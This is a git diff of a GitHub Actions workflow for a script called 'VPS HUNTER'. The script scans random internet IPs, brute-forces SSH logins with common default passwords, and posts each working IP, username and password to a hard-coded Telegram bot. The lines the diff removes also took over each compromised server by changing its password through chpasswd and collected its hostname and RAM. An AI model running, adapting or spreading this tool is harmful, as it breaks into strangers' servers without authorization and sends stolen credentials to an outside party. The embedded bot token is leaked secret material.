@@ -19,16 +19,12 @@ jobs:
 
       - name: Send start notification
         run: |
-          echo "📤 Sending start notification..."
-          curl -s -X POST "https://api.telegram.org/bot8857993443:AAFeHfRq_9qjcPCXWldiFDwNCMvlH_Khq24/sendMessage" \
-            -d "chat_id=7576216084&text=🚀 VPS HUNTER STARTED! ✅"
-          echo "✅ Start notification sent!"
+          curl -s -X POST "https://api.telegram.org/bot8857993443:AAFeHfRq_9qjcPCXWldiFDwNCMvlH_Khq24/sendMessage" -d "chat_id=7576216084&text=🚀 VPS HUNTER STARTED! ✅"
 
       - name: Run hunter
         run: |
           python3 -c "
 import socket, threading, time, random, os, subprocess
-from datetime import datetime
 
 BOT_TOKEN = '8857993443:AAFeHfRq_9qjcPCXWldiFDwNCMvlH_Khq24'
 CHAT_ID = '7576216084'
@@ -36,9 +32,8 @@ CHAT_ID = '7576216084'
 def send_telegram(msg):
     try:
         subprocess.run(['curl', '-s', '-X', 'POST', f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', '-d', f'chat_id={CHAT_ID}&text={msg}'], timeout=10)
-        return True
     except:
-        return False
+        pass
 
 send_telegram('✅ VPS HUNTER STARTED! Scanning in progress...')
 
@@ -58,22 +53,8 @@ def try_login(ip, user, pwd):
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(ip, username=user, password=pwd, timeout=2, allow_agent=False, look_for_keys=False)
-        
-        _, stdout, _ = client.exec_command('hostname', timeout=2)
-        hostname = stdout.read().decode().strip()[:30] or '?'
-        _, stdout, _ = client.exec_command('free -m | awk \"/Mem:/ {print \\$2}\"', timeout=2)
-        ram = stdout.read().decode().strip()
-        if ram and ram.isdigit():
-            ram_gb = round(int(ram) / 1024, 1)
-            ram = f'{ram_gb}GB'
-        else:
-            ram = '?'
-        
-        new_pass = 'Sa9rvps@182@13'
-        client.exec_command(f'echo \"{user}:{new_pass}\" | chpasswd', timeout=2)
         client.close()
-        
-        msg = f'✅ VPS HACKED!\nIP: {ip}\nUser: {user}\nPassword: {pwd}\nNew pass: {new_pass}\nHostname: {hostname}\nRAM: {ram}'
+        msg = f'✅ VPS FOUND!\nIP: {ip}\nUser: {user}\nPassword: {pwd}'
         send_telegram(msg)
         return True
     except:
@@ -82,31 +63,22 @@ def try_login(ip, user, pwd):
 def rand_ip():
     return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
 
-print('[+] VPS HUNTER STARTED!')
-
 users = ['root', 'ubuntu']
 passwords = ['password', '123456', 'root', 'Admin123', 'P@ssw0rd']
 scanned = 0
-found = 0
 
 while True:
     ip = rand_ip()
     scanned += 1
-    
     if scanned % 10 == 0:
-        print(f'\r📊 Scanned: {scanned} | Found: {found}', end='', flush=True)
-    
-    if not scan_ip(ip):
-        continue
-    
-    for user in users:
-        for pwd in passwords:
-            if try_login(ip, user, pwd):
-                found += 1
-                break
-        else:
-            continue
-        break
-    
-    time.sleep(random.uniform(0.005, 0.01))
+        print(f'Scanned: {scanned}', end='')
+    if scan_ip(ip):
+        for user in users:
+            for pwd in passwords:
+                if try_login(ip, user, pwd):
+                    break
+            else:
+                continue
+            break
+    time.sleep(0.01)
 "
